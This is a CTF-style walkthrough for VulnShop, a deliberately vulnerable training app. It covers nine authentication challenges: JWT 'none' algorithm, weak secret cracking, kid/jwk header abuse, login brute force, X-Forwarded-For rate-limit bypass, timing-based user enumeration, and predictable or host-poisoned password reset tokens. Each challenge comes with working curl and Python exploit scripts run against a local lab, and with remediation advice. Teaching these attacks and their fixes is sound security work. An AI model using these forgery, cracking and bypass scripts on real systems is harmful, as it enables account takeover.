# VulnShop - Exploitation Walkthrough & Remediation Guide

This guide provides step-by-step instructions, progressive hints, reproducible exploit commands, and remediation strategies for all 9 authentication challenges in **VulnShop** (`shop-auth`).

> [!NOTE]
> Per CTF guidelines, plaintext flags are omitted from this document. Running the provided commands against the application will yield the corresponding dynamic flags (`VULNLAB{...}`).

---

## 1. Challenge Group: `shop-auth-jwt` (JWT Vulnerabilities)

### Easy Mode: `shop-auth-jwt-easy` (Weak JWT None Algorithm)
- **Target**: `GET /api/admin/dashboard`
- **Objective**: Gain administrative access by forging an unverified JWT with `"alg": "none"`.

#### Hints
1. **Hint 1**: JSON Web Tokens consist of three base64url-encoded parts separated by dots: `Header.Payload.Signature`.
2. **Hint 2**: RFC 7519 allows an algorithm named `"none"`. In flawed implementations, setting `"alg": "none"` causes the backend to accept the token without verifying any signature.

<details>
<summary>Solution</summary>

1. Construct the unverified JWT header and payload:
   - Header: `{"alg": "none", "typ": "JWT"}`
   - Payload: `{"username": "admin", "role": "admin"}`
2. Encode each segment as Base64URL and append a trailing dot with an empty signature:
   ```bash
   HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '/+' '_-' | tr -d '=')
   PAYLOAD=$(echo -n '{"username":"admin","role":"admin"}' | base64 | tr '/+' '_-' | tr -d '=')
   TOKEN="${HEADER}.${PAYLOAD}."
   ```
3. Submit the forged token to the administrative dashboard:
   ```bash
   curl -s -H "Authorization: Bearer ${TOKEN}" http://127.0.0.1:8004/api/admin/dashboard
   ```
4. The server accepts the token and returns `FLAG_SHOP_AUTH_JWT_EASY`.
</details>

#### How to Fix
- Explicitly whitelist permitted algorithms during verification (e.g. `algorithms: ['HS256']`).
- Reject any token specifying `alg: "none"`, `None`, or `NONE` regardless of environment.

---

### Medium Mode: `shop-auth-jwt-medium` (Weak JWT Secret Brute Force)
- **Target**: `GET /api/admin/dashboard`
- **Objective**: Crack the HMAC-SHA256 dictionary secret key and forge a valid administrator token.

#### Hints
1. **Hint 1**: The server now strictly checks that `alg` is `HS256` and computes a signature.
2. **Hint 2**: Register a normal user or capture a login token. Use a wordlist attack to check if the signing key is a common dictionary password (e.g. `secret123`, `password`, `admin`).

<details>
<summary>Solution</summary>

1. Register or sign in to obtain a legitimate JWT token:
   ```bash
   TOKEN=$(curl -s -X POST http://127.0.0.1:8004/api/register \
     -H "Content-Type: application/json" \
     -d '{"username":"attacker","email":"attacker@vulnshop.local","password":"password123"}' \
     | jq -r '.token')
   echo "Captured Token: $TOKEN"
   ```
2. Crack the token secret using a dictionary tool or quick Python script:
   ```python
   import hmac, hashlib, base64

   token = "$TOKEN"
   parts = token.split('.')
   data = f"{parts[0]}.{parts[1]}".encode()
   target_sig = parts[2]

   passwords = ["123456", "password", "secret", "secret123", "admin", "welcome"]
   for p in passwords:
       sig = base64.urlsafe_b64encode(hmac.new(p.encode(), data, hashlib.sha256).digest()).decode().rstrip('=')
       if sig == target_sig:
           print(f"[+] Secret cracked: {p}")
           break
   ```
   The cracked secret is `secret123`.

3. Forge a new token with `role: "admin"` and sign it with `secret123`:
   ```bash
   python3 - << 'EOF'
   import hmac, hashlib, base64, json, requests

   header = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).decode().rstrip('=')
   payload = base64.urlsafe_b64encode(json.dumps({"username":"admin","role":"admin"}).encode()).decode().rstrip('=')
   data = f"{header}.{payload}".encode()
   signature = base64.urlsafe_b64encode(hmac.new(b"secret123", data, hashlib.sha256).digest()).decode().rstrip('=')
   forged_token = f"{header}.{payload}.{signature}"

   res = requests.get("http://127.0.0.1:8004/api/admin/dashboard", headers={"Authorization": f"Bearer {forged_token}"})
   print(res.json())
   EOF
   ```
4. Access is granted and the response contains `FLAG_SHOP_AUTH_JWT_MEDIUM`.
</details>

#### How to Fix
- Use high-entropy, cryptographically random keys (at least 256 bits / 32 bytes) for HMAC-SHA256 signing.
- Store secrets securely in environment variables or key management services (KMS), never in source code.

---

### Hard Mode: `shop-auth-jwt-hard` (Header Parameter Confusion / Key ID Traversal)
- **Target**: `GET /api/admin/dashboard`
- **Objective**: Exploit unvalidated JWT header parameters (`kid` path traversal or embedded `jwk`) to control the HMAC verification secret.

#### Hints
1. **Hint 1**: Inspect the default token issued in Hard mode. Notice the header contains `"kid": "src/public/keys/default.key"`.
2. **Hint 2**: If the backend reads the file path directly from `header.kid` without path validation, what happens if you point `kid` to `/dev/null`? An empty file produces an empty secret key (`""`).
3. **Hint 3**: Alternatively, the server supports embedded `jwk` objects with client-provided symmetric keys.

<details>
<summary>Solution</summary>

#### Method A: Key ID (`kid`) Path Traversal to `/dev/null`
1. When `kid` is set to `/dev/null`, the server reads 0 bytes, making the verification secret an empty string `""`.
2. Construct and sign the token with secret `""`:
   ```bash
   python3 - << 'EOF'
   import hmac, hashlib, base64, json, requests

   header = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"}).encode()).decode().rstrip('=')
   payload = base64.urlsafe_b64encode(json.dumps({"username":"admin","role":"admin"}).encode()).decode().rstrip('=')
   data = f"{header}.{payload}".encode()
   signature = base64.urlsafe_b64encode(hmac.new(b"", data, hashlib.sha256).digest()).decode().rstrip('=')
   forged_token = f"{header}.{payload}.{signature}"

   res = requests.get("http://127.0.0.1:8004/api/admin/dashboard", headers={"Authorization": f"Bearer {forged_token}"})
   print(res.json())
   EOF
   ```

#### Method B: Embedded `jwk` Parameter Injection
1. Inject a client-controlled key via `header.jwk.k`:
   ```bash
   python3 - << 'EOF'
   import hmac, hashlib, base64, json, requests

   attacker_secret = "evil_key_123"
   encoded_key = base64.b64encode(attacker_secret.encode()).decode()

   header = base64.urlsafe_b64encode(json.dumps({
       "alg": "HS256",
       "typ": "JWT",
       "jwk": {"kty": "oct", "k": encoded_key}
   }).encode()).decode().rstrip('=')
   payload = base64.urlsafe_b64encode(json.dumps({"username":"admin","role":"admin"}).encode()).decode().rstrip('=')
   data = f"{header}.{payload}".encode()
   signature = base64.urlsafe_b64encode(hmac.new(attacker_secret.encode(), data, hashlib.sha256).digest()).decode().rstrip('=')
   forged_token = f"{header}.{payload}.{signature}"

   res = requests.get("http://127.0.0.1:8004/api/admin/dashboard", headers={"Authorization": f"Bearer {forged_token}"})
   print(res.json())
   EOF
   ```
2. The server verifies the token against your injected key and returns `FLAG_SHOP_AUTH_JWT_HARD`.
</details>

#### How to Fix
- Never use user-supplied `kid` values directly as filesystem paths. Use an internal lookup table mapping IDs to trusted keys.
- Do not trust embedded public/symmetric keys (`jwk`) without validating against a trusted certificate authority or pre-shared trust store.

---

## 2. Challenge Group: `shop-auth-bruteforce` (Credential Bruteforce)

### Easy Mode: `shop-auth-bruteforce-easy` (No Login Rate Limiting)
- **Target**: `POST /api/login`
- **Objective**: Brute force the administrator password without restriction.

#### Hints
1. **Hint 1**: The administrator account username is `admin`.
2. **Hint 2**: Test top dictionary passwords (e.g. `admin`, `password`, `123456`, `admin123`).

<details>
<summary>Solution</summary>

1. Send a login request for user `admin` with password `admin123`:
   ```bash
   curl -s -X POST http://127.0.0.1:8004/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"admin123"}'
   ```
2. The server responds with HTTP 200 and `FLAG_SHOP_AUTH_BRUTEFORCE_EASY`.
</details>

#### How to Fix
- Implement IP-based and account-based rate limiting (e.g. maximum 5 attempts per minute).
- Implement progressive delays or account lockout after repeated failed attempts.

---

### Medium Mode: `shop-auth-bruteforce-medium` (Header-Bypass Rate Limiting)
- **Target**: `POST /api/login`
- **Objective**: Bypass the IP rate limiter using spoofed client IP headers (`X-Forwarded-For`).

#### Hints
1. **Hint 1**: After 5 failed attempts from a single IP, the server returns `HTTP 429 Too Many Requests`.
2. **Hint 2**: The backend determines the client IP from the `X-Forwarded-For` header. Changing this header on each request resets the rate limit bucket.

<details>
<summary>Solution</summary>

1. Test rate limit triggering:
   ```bash
   for i in {1..6}; do
     curl -s -X POST http://127.0.0.1:8004/api/login \
       -H "Content-Type: application/json" \
       -H "X-Forwarded-For: 192.168.1.10" \
       -d '{"username":"admin","password":"wrongpassword"}'
   done
   ```
2. Bypass the block by rotating the `X-Forwarded-For` address with the correct password `admin123`:
   ```bash
   curl -s -X POST http://127.0.0.1:8004/api/login \
     -H "Content-Type: application/json" \
     -H "X-Forwarded-For: 192.168.1.99" \
     -d '{"username":"admin","password":"admin123"}'
   ```
3. The server authenticates the session and returns `FLAG_SHOP_AUTH_BRUTEFORCE_MEDIUM`.
</details>

#### How to Fix
- Do not trust client-supplied proxy headers (`X-Forwarded-For`, `Client-IP`) unless the request originates from a verified, trusted reverse proxy CIDR block.
- Configure Express with `app.set('trust proxy', 'loopback')` and use strict socket IP tracking.

---

### Hard Mode: `shop-auth-bruteforce-hard` (Timing/Response Attack)
- **Target**: `POST /api/login`
- **Objective**: Enumerate valid staff accounts via response timing discrepancies, then authenticate using standard credentials.

#### Hints
1. **Hint 1**: In Hard mode, `admin` has a 32-character random unguessable password. However, additional staff accounts exist in the database.
2. **Hint 2**: Time candidate usernames on `/api/login`. Non-existent accounts return in ~1-5ms, while valid accounts trigger password hash checks taking ~250-350ms.
3. **Hint 3**: Check common operations accounts such as `support`.

<details>
<summary>Solution</summary>

1. Measure login response latency for common account names:
   ```bash
   python3 - << 'EOF'
   import requests, time

   users = ["admin", "root", "guest", "support", "test", "sales", "operator"]
   for u in users:
       start = time.time()
       res = requests.post("http://127.0.0.1:8004/api/login",
                           json={"username": u, "password": "dummy_password"},
                           headers={"X-Forwarded-For": f"10.0.0.{len(u)}"})
       elapsed = (time.time() - start) * 1000
       print(f"User '{u:10}': {elapsed:6.1f} ms | Status: {res.status_code}")
   EOF
   ```
   Users `admin` and `support` take ~250ms+ whereas invalid users take <10ms, confirming `support` is a valid user.

2. Test standard support passwords against `support`:
   ```bash
   curl -s -X POST http://127.0.0.1:8004/api/login \
     -H "Content-Type: application/json" \
     -H "X-Forwarded-For: 10.0.0.55" \
     -d '{"username":"support","password":"welcome123"}'
   ```
3. Successful login returns `FLAG_SHOP_AUTH_BRUTEFORCE_HARD`.
</details>

#### How to Fix
- Use constant-time authentication algorithms: execute a dummy password hash computation even when the username does not exist.
- Standardize error messages and response times across all authentication branches.

---

## 3. Challenge Group: `shop-auth-reset` (Password Reset Vulnerabilities)

### Easy Mode: `shop-auth-reset-easy` (Predictable Reset Token MD5)
- **Target**: `POST /api/forgot-password` and `POST /api/reset-password`
- **Objective**: Compute the deterministic MD5 reset token for `admin` and reset their password.

#### Hints
1. **Hint 1**: Request a password reset for user `admin`.
2. **Hint 2**: In Easy mode, the reset token is calculated as `md5(username)`.

<details>
<summary>Solution</summary>

1. Request a password reset for `admin`:
   ```bash
   curl -s -X POST http://127.0.0.1:8004/api/forgot-password \
     -H "Content-Type: application/json" \
     -d '{"username":"admin"}'
   ```
2. Compute `md5("admin")`:
   ```bash
   TOKEN=$(echo -n "admin" | md5sum | awk '{print $1}')
   echo "Computed Token: $TOKEN" # 21232f297a57a5a743894a0e4a801fc3
   ```
3. Submit the token to reset the administrator password:
   ```bash
   curl -s -X POST http://127.0.0.1:8004/api/reset-password \
     -H "Content-Type: application/json" \
     -d "{\"token\":\"${TOKEN}\",\"newPassword\":\"adminResetP@ss123\"}"
   ```
4. The server resets the password and returns `FLAG_SHOP_AUTH_RESET_EASY`.
</details>

#### How to Fix
- Never generate tokens based solely on predictable user attributes like username or email.
- Use `crypto.randomBytes(32)` to generate high-entropy tokens.

---

### Medium Mode: `shop-auth-reset-medium` (Predictable Reset Timestamp)
- **Target**: `POST /api/forgot-password` and `POST /api/reset-password`
- **Objective**: Predict the timestamp-seeded token `sha1(username + unix_timestamp_seconds)`.

#### Hints
1. **Hint 1**: The token formula is `sha1(username + Math.floor(Date.now() / 1000))`.
2. **Hint 2**: Record the timestamp when requesting the reset, then iterate over a small candidate range (+/- 5 seconds).

<details>
<summary>Solution</summary>

1. Run the Python solver script:
   ```bash
   python3 - << 'EOF'
   import requests, time, hashlib

   # 1. Trigger reset request and record timestamp
   t_start = int(time.time())
   requests.post("http://127.0.0.1:8004/api/forgot-password", json={"username": "admin"})
   t_end = int(time.time())

   # 2. Test candidate timestamps
   for t in range(t_start - 2, t_end + 3):
       token = hashlib.sha1(f"admin{t}".encode()).hexdigest()
       res = requests.post("http://127.0.0.1:8004/api/reset-password",
                           json={"token": token, "newPassword": "NewAdminPassword123!"})
       if res.status_code == 200 and "flag" in res.json():
           print("[+] Success!")
           print(res.json())
           break
   EOF
   ```
2. The server matches the valid timestamp token and outputs `FLAG_SHOP_AUTH_RESET_MEDIUM`.
</details>

#### How to Fix
- Do not seed cryptographic tokens with timestamps or predictable PRNGs (`Math.random()`).
- Use secure CSPRNGs (`crypto.randomBytes`) and store tokens with a strict expiration time.

---

### Hard Mode: `shop-auth-reset-hard` (Host Header Poisoning Reset)
- **Target**: `POST /api/forgot-password` and `POST /api/reset-password`
- **Objective**: Poison the `Host` / `X-Forwarded-Host` header during password reset generation to hijack the reset token from the simulated outbox.

#### Hints
1. **Hint 1**: The server constructs the reset link as `http://${req.headers.host}/reset-password?token=${token}`.
2. **Hint 2**: Inspect the simulated outbox at `GET /api/emails`.
3. **Hint 3**: When you send a reset request with a custom `Host` or `X-Forwarded-Host` header (e.g. `evil-attacker.local`), the outbox captures the poisoned link. Redeem that token at `/api/reset-password`.

<details>
<summary>Solution</summary>

1. Send a password reset request with a poisoned `X-Forwarded-Host` header:
   ```bash
   curl -s -X POST http://127.0.0.1:8004/api/forgot-password \
     -H "Content-Type: application/json" \
     -H "X-Forwarded-Host: evil-attacker.local" \
     -d '{"username":"admin"}'
   ```
2. Query the simulated email outbox to retrieve the generated reset email:
   ```bash
   curl -s http://127.0.0.1:8004/api/emails | jq '.emails[0]'
   ```
3. Extract the reset token from the poisoned link:
   ```bash
   TOKEN=$(curl -s http://127.0.0.1:8004/api/emails | jq -r '.emails[0].resetLink' | grep -o 'token=[^&]*' | cut -d= -f2)
   echo "Poisoned Token: $TOKEN"
   ```
4. Submit the token to `/api/reset-password`:
   ```bash
   curl -s -X POST http://127.0.0.1:8004/api/reset-password \
     -H "Content-Type: application/json" \
     -d "{\"token\":\"${TOKEN}\",\"newPassword\":\"HackedAdminPassword123\"}"
   ```
5. The server confirms the reset of the administrator account via the poisoned host link and returns `FLAG_SHOP_AUTH_RESET_HARD`.
</details>

#### How to Fix
- Never construct absolute URLs using unvalidated client `Host` or `X-Forwarded-Host` headers.
- Hardcode the application's canonical domain in a server-side configuration variable (e.g. `APP_BASE_URL=https://shop.example.com`).
- Validate incoming `Host` headers against a strict whitelist at the reverse proxy or web server layer.
